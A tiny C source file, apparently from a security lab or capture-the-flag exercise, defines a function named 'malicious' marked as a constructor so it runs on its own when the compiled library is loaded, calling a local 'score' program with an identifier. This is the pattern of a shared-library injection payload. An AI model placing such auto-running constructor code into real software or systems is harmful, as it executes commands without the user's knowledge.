#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score af2cf132-3397-4771-b64c-20fac9c416a3");
}
